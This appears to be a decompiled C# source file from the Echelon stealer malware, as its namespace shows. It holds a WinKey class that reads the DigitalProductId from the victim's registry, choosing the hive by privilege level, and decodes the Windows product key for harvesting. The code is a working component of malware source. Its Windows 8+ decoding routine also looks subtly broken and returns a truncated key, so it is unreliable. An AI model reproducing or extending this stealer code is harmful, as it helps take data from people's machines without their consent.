﻿using System;
using System.Collections;
using Microsoft.Win32;

namespace Echelon.Stealer.SystemsData
{
	// Token: 0x0200002A RID: 42
	internal class WinKey
	{
		// Token: 0x0600009E RID: 158 RVA: 0x0001BB14 File Offset: 0x00019D14
		public static string GetDecodeKey(byte[] DigitalProductID)
		{
			int num = 0;
			ArrayList arrayList = new ArrayList();
			for (int i = 52; i <= 67; i++)
			{
				arrayList.Add(DigitalProductID[i]);
			}
			char[] array = new char[29];
			for (int j = 28; j >= 0; j--)
			{
				if ((j + 1) % 6 != 0)
				{
					for (int k = 14; k >= 0; k--)
					{
						arrayList[k] = (byte)((num << 8 | (int)((byte)arrayList[k])) / 24);
						num = (num << 8 | (int)((byte)arrayList[k])) % 24;
						char[] array2 = new char[]
						{
							'B',
							'C',
							'D',
							'F',
							'G',
							'H',
							'J',
							'K',
							'M',
							'P',
							'Q',
							'R',
							'T',
							'V',
							'W',
							'X',
							'Y',
							'2',
							'3',
							'4',
							'6',
							'7',
							'8',
							'9'
						};
						array[j] = array2[num];
					}
				}
				else
				{
					array[j] = '-';
				}
			}
			return new string(array);
		}

		// Token: 0x0600009F RID: 159 RVA: 0x0001BBDC File Offset: 0x00019DDC
		public static string GetDecodeKeyWin8AndUp(byte[] DigitalProductId)
		{
			string text = string.Empty;
			int num = 0;
			DigitalProductId[66] = ((DigitalProductId[66] & 247) | 0);
			for (int i = 24; i >= 0; i--)
			{
				for (int j = 14; j >= 0; j--)
				{
					num *= 256;
					num = (int)DigitalProductId[j + 52] + num;
					DigitalProductId[j + 52] = (byte)(num / 24);
					num %= 24;
				}
			}
			text = string.Format("{0}{1}", "BCDFGHJKMPQRTVWXY2346789"[num], text);
			text = text.Substring(1, 0) + "N" + text.Substring(1, text.Length - 1);
			for (int k = 5; k < text.Length; k += 6)
			{
				text = text.Insert(k, "-");
			}
			return text;
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x0001BCA0 File Offset: 0x00019EA0
		public static string GetWindowsKey(string Path, string GetID)
		{
			string result = string.Empty;
			RegistryHive hKey = RunChecker.IsAdmin ? RegistryHive.LocalMachine : RegistryHive.CurrentUser;
			RegistryView view = RunChecker.IsWin64 ? RegistryView.Registry64 : RegistryView.Registry32;
			string result2;
			try
			{
				using (RegistryKey registryKey = RegistryKey.OpenBaseKey(hKey, view))
				{
					using (RegistryKey registryKey2 = registryKey.OpenSubKey(Path, RunChecker.IsWin64))
					{
						result = (((Environment.OSVersion.Version.Major != 6 || Environment.OSVersion.Version.Minor < 2) && Environment.OSVersion.Version.Major <= 6) ? WinKey.GetDecodeKey((byte[])registryKey2.GetValue(GetID)) : WinKey.GetDecodeKeyWin8AndUp((byte[])registryKey2.GetValue(GetID)));
					}
				}
				return result;
			}
			catch (Exception)
			{
				result2 = "Unknown WinKey";
			}
			return result2;
		}
	}
}
